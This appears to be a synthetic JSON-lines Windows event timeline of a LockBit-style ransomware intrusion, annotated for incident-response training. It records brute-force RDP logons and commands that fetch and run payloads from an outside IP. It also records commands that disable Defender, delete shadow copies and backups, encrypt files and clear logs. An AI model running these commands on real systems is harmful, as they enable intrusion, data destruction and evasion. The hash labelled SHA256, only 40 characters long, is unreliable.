{"datetime":"2024-11-15T06:12:04Z","timestamp_desc":"Logon Failure","hostname":"DC-01","username":"Administrator","event_id":"4625","message":"An account failed to log on. Subject: Security ID: S-1-0-0. Logon Type: 10 (RemoteInteractive). Account For Which Logon Failed: Account Name: Administrator. Account Domain: CORP. Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D. Sub Status: 0xC0000064. Network Information: Workstation Name: - Source Network Address: 185.234.219.42 Source Port: 51204. This event is generated when a logon request fails."}
{"datetime":"2024-11-15T06:18:41Z","timestamp_desc":"Logon Failure","hostname":"DC-01","username":"Administrator","event_id":"4625","message":"An account failed to log on. Subject: Security ID: S-1-0-0. Logon Type: 10 (RemoteInteractive). Account For Which Logon Failed: Account Name: Administrator. Account Domain: CORP. Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D. Sub Status: 0xC000006A. Network Information: Source Network Address: 185.234.219.42 Source Port: 51388."}
{"datetime":"2024-11-15T06:29:17Z","timestamp_desc":"Logon Failure","hostname":"DC-01","username":"Administrator","event_id":"4625","message":"An account failed to log on. Subject: Security ID: S-1-0-0. Logon Type: 10 (RemoteInteractive). Account For Which Logon Failed: Account Name: Administrator. Account Domain: CORP. Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D. Sub Status: 0xC000006A. Network Information: Source Network Address: 185.234.219.42 Source Port: 52019."}
{"datetime":"2024-11-15T06:38:55Z","timestamp_desc":"Logon Failure","hostname":"DC-01","username":"Administrator","event_id":"4625","message":"An account failed to log on. Subject: Security ID: S-1-0-0. Logon Type: 10 (RemoteInteractive). Account For Which Logon Failed: Account Name: Administrator. Account Domain: CORP. Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A. Network Information: Source Network Address: 185.234.219.42 Source Port: 52741."}
{"datetime":"2024-11-15T06:47:03Z","timestamp_desc":"Logon Failure","hostname":"DC-01","username":"Administrator","event_id":"4625","message":"An account failed to log on. Logon Type: 10 (RemoteInteractive). Account Name: Administrator. Account Domain: CORP. Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A. Source Network Address: 185.234.219.42 Source Port: 53104."}
{"datetime":"2024-11-15T06:48:39Z","timestamp_desc":"Logon Success","hostname":"DC-01","username":"Administrator","event_id":"4624","message":"An account was successfully logged on. Subject: Security ID: S-1-0-0. Logon Information: Logon Type: 10 (RemoteInteractive). New Logon: Security ID: S-1-5-21-3847228890-1233509040-820765948-500 Account Name: Administrator Account Domain: CORP Logon ID: 0x8B3F40. Process Information: Process Name: C:\\Windows\\System32\\winlogon.exe. Network Information: Workstation Name: DC-01 Source Network Address: 185.234.219.42 Source Port: 53412. Authentication Package: Negotiate."}
{"datetime":"2024-11-15T06:49:15Z","timestamp_desc":"Process Created","hostname":"DC-01","username":"Administrator","event_id":"4688","message":"A new process has been created. Creator Subject: Security ID: S-1-5-21-3847228890-1233509040-820765948-500 Account Name: Administrator Account Domain: CORP Logon ID: 0x8B3F40. Process Information: New Process ID: 0x14CC New Process Name: C:\\Windows\\System32\\cmd.exe Token Elevation Type: TokenElevationTypeFull (2) Creator Process Name: C:\\Windows\\System32\\winlogon.exe Process Command Line: cmd.exe /c whoami && net user /domain && net group \"Domain Admins\" /domain && ipconfig /all && nltest /dclist:corp.local && arp -a"}
{"datetime":"2024-11-15T06:49:44Z","timestamp_desc":"Process Created","hostname":"DC-01","username":"Administrator","event_id":"4688","message":"A new process has been created. Creator Subject: Security ID: S-1-5-21-3847228890-1233509040-820765948-500 Account Name: Administrator Account Domain: CORP Logon ID: 0x8B3F40. Process Information: New Process ID: 0x1A08 New Process Name: C:\\Windows\\System32\\net.exe Token Elevation Type: TokenElevationTypeFull (2) Creator Process Name: C:\\Windows\\System32\\cmd.exe Process Command Line: net view /domain"}
{"datetime":"2024-11-15T06:50:12Z","timestamp_desc":"Process Created","hostname":"DC-01","username":"Administrator","event_id":"4688","message":"A new process has been created. Creator Subject: Security ID: S-1-5-21-3847228890-1233509040-820765948-500 Account Name: Administrator Account Domain: CORP Logon ID: 0x8B3F40. Process Information: New Process ID: 0x1B44 New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Token Elevation Type: TokenElevationTypeFull (2) Creator Process Name: C:\\Windows\\System32\\cmd.exe Process Command Line: powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"$wc=New-Object Net.WebClient;$wc.DownloadFile('http://185.234.219.42:8080/tools/psexec.exe','C:\\Windows\\Temp\\svhost.exe');\""}
{"datetime":"2024-11-15T06:51:03Z","timestamp_desc":"Logon Success","hostname":"FILESERVER-01","username":"Administrator","event_id":"4624","message":"An account was successfully logged on. Logon Type: 3 (Network). New Logon: Security ID: S-1-5-21-3847228890-1233509040-820765948-500 Account Name: Administrator Account Domain: CORP Logon ID: 0x9C1F22. Network Information: Workstation Name: DC-01 Source Network Address: 10.0.0.10 Source Port: 49812. Authentication Package: NTLM. This is a lateral movement indicator — DC-01 pivoting to FILESERVER-01 via PsExec."}
{"datetime":"2024-11-15T06:51:28Z","timestamp_desc":"Process Created","hostname":"FILESERVER-01","username":"Administrator","event_id":"4688","message":"A new process has been created. Process Information: New Process ID: 0x0E94 New Process Name: C:\\Windows\\System32\\cmd.exe Token Elevation Type: TokenElevationTypeFull (2) Creator Process Name: C:\\Windows\\PSEXESVC.exe Process Command Line: cmd.exe /c certutil.exe -urlcache -split -f http://185.234.219.42:8080/payload/lb.exe C:\\ProgramData\\Microsoft\\lb.exe && C:\\ProgramData\\Microsoft\\lb.exe"}
{"datetime":"2024-11-15T06:52:07Z","timestamp_desc":"Process Created","hostname":"FILESERVER-01","username":"Administrator","event_id":"4688","message":"A new process has been created. Process Information: New Process ID: 0x2134 New Process Name: C:\\Windows\\System32\\certutil.exe Token Elevation Type: TokenElevationTypeFull (2) Creator Process Name: C:\\Windows\\System32\\cmd.exe Process Command Line: certutil.exe -urlcache -split -f http://185.234.219.42:8080/payload/lb.exe C:\\ProgramData\\Microsoft\\lb.exe Ingress tool transfer via certutil (T1105). SHA256 of download: 3F4A8B2C1D9E7F6A5B4C3D2E1F0A9B8C7D6E5F4A."}
{"datetime":"2024-11-15T06:53:19Z","timestamp_desc":"Process Created","hostname":"DC-01","username":"Administrator","event_id":"4688","message":"A new process has been created. Process Information: New Process ID: 0x1F5C New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Token Elevation Type: TokenElevationTypeFull (2) Creator Process Name: C:\\Windows\\System32\\cmd.exe Process Command Line: powershell.exe -NonInteractive -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEA (decoded: Set-MpPreference -DisableRealtimeMonitoring 1)"}
{"datetime":"2024-11-15T06:53:55Z","timestamp_desc":"Process Created","hostname":"DC-01","username":"Administrator","event_id":"4688","message":"A new process has been created. Process Information: New Process ID: 0x20A8 New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Token Elevation Type: TokenElevationTypeFull (2) Creator Process Name: C:\\Windows\\System32\\cmd.exe Process Command Line: powershell.exe -Command \"Add-MpPreference -ExclusionPath 'C:\\ProgramData\\Microsoft\\','C:\\Windows\\Temp\\'\" Token: Defender AV exclusions added to allow ransomware staging paths."}
{"datetime":"2024-11-15T06:55:22Z","timestamp_desc":"Process Created","hostname":"DC-01","username":"Administrator","event_id":"4688","message":"A new process has been created. Process Information: New Process ID: 0x22DC New Process Name: C:\\Windows\\System32\\vssadmin.exe Token Elevation Type: TokenElevationTypeFull (2) Creator Process Name: C:\\Windows\\System32\\cmd.exe Process Command Line: vssadmin.exe Delete Shadows /All /Quiet Inhibit system recovery (T1490) — all volume shadow copies deleted before encryption phase."}
{"datetime":"2024-11-15T06:55:49Z","timestamp_desc":"Process Created","hostname":"DC-01","username":"Administrator","event_id":"4688","message":"A new process has been created. Process Information: New Process ID: 0x2318 New Process Name: C:\\Windows\\System32\\wbadmin.exe Token Elevation Type: TokenElevationTypeFull (2) Creator Process Name: C:\\Windows\\System32\\cmd.exe Process Command Line: wbadmin.exe delete catalog -quiet"}
{"datetime":"2024-11-15T06:56:01Z","timestamp_desc":"Process Created","hostname":"DC-01","username":"Administrator","event_id":"4688","message":"A new process has been created. Process Information: New Process ID: 0x2344 New Process Name: C:\\Windows\\System32\\bcdedit.exe Token Elevation Type: TokenElevationTypeFull (2) Creator Process Name: C:\\Windows\\System32\\cmd.exe Process Command Line: bcdedit.exe /set {default} recoveryenabled No"}
{"datetime":"2024-11-15T06:56:14Z","timestamp_desc":"Process Created","hostname":"DC-01","username":"Administrator","event_id":"4688","message":"A new process has been created. Process Information: New Process ID: 0x2360 New Process Name: C:\\Windows\\System32\\bcdedit.exe Token Elevation Type: TokenElevationTypeFull (2) Creator Process Name: C:\\Windows\\System32\\cmd.exe Process Command Line: bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures"}
{"datetime":"2024-11-15T06:57:04Z","timestamp_desc":"Process Created","hostname":"FILESERVER-01","username":"Administrator","event_id":"4688","message":"A new process has been created. Process Information: New Process ID: 0x2580 New Process Name: C:\\ProgramData\\Microsoft\\lb.exe Token Elevation Type: TokenElevationTypeFull (2) Creator Process Name: C:\\Windows\\System32\\cmd.exe Process Command Line: lb.exe --path C:\\ --ext .doc,.docx,.xls,.xlsx,.ppt,.pptx,.pdf,.sql,.mdf,.bak,.zip,.jpg,.png --skip C:\\Windows\\ --threads 12. LockBit 3.0 ransomware execution: mass file encryption with 12 threads."}
{"datetime":"2024-11-15T06:58:33Z","timestamp_desc":"Process Created","hostname":"FILESERVER-01","username":"Administrator","event_id":"4688","message":"A new process has been created. Process Information: New Process ID: 0x2744 New Process Name: C:\\Windows\\System32\\cmd.exe Token Elevation Type: TokenElevationTypeFull (2) Creator Process Name: C:\\ProgramData\\Microsoft\\lb.exe Process Command Line: cmd.exe /c for /r C:\\FileShares %f in (*.bak *.sql *.mdf) do del /f /q \"%f\" && icacls C:\\FileShares /deny Everyone:(OI)(CI)F /t"}
{"datetime":"2024-11-15T06:59:15Z","timestamp_desc":"Process Created","hostname":"DC-01","username":"Administrator","event_id":"4688","message":"A new process has been created. Process Information: New Process ID: 0x28BC New Process Name: C:\\Windows\\System32\\cmd.exe Token Elevation Type: TokenElevationTypeFull (2) Creator Process Name: C:\\ProgramData\\Microsoft\\lb.exe Process Command Line: cmd.exe /c copy /y C:\\ProgramData\\Microsoft\\LockBit_README.txt C:\\Users\\Public\\ && copy /y C:\\ProgramData\\Microsoft\\LockBit_README.txt C:\\Windows\\Temp\\ && for /r C:\\ %d in (.) do copy /y C:\\ProgramData\\Microsoft\\LockBit_README.txt \"%d\". Ransom note LockBit_README.txt dropped in all directories."}
{"datetime":"2024-11-15T07:00:04Z","timestamp_desc":"Security Audit Log Cleared","hostname":"DC-01","username":"Administrator","event_id":"1102","message":"The audit log was cleared. Subject: Security ID: S-1-5-21-3847228890-1233509040-820765948-500 Account Name: Administrator Account Domain: CORP Logon ID: 0x8B3F40. The security event log was cleared using wevtutil.exe cl security to remove evidence of initial RDP brute force and lateral movement activity."}
{"datetime":"2024-11-15T07:00:31Z","timestamp_desc":"Process Created","hostname":"DC-01","username":"Administrator","event_id":"4688","message":"A new process has been created. Process Information: New Process ID: 0x2A10 New Process Name: C:\\Windows\\System32\\wevtutil.exe Token Elevation Type: TokenElevationTypeFull (2) Creator Process Name: C:\\Windows\\System32\\cmd.exe Process Command Line: wevtutil.exe cl System && wevtutil.exe cl Application && wevtutil.exe cl \"Windows PowerShell\""}
{"datetime":"2024-11-15T07:01:12Z","timestamp_desc":"Process Created","hostname":"FILESERVER-01","username":"Administrator","event_id":"4688","message":"A new process has been created. Process Information: New Process ID: 0x2C44 New Process Name: C:\\Windows\\System32\\wmic.exe Token Elevation Type: TokenElevationTypeFull (2) Creator Process Name: C:\\Windows\\System32\\cmd.exe Process Command Line: wmic.exe shadowcopy delete LockBit secondary VSS cleanup on file server after encryption complete."}
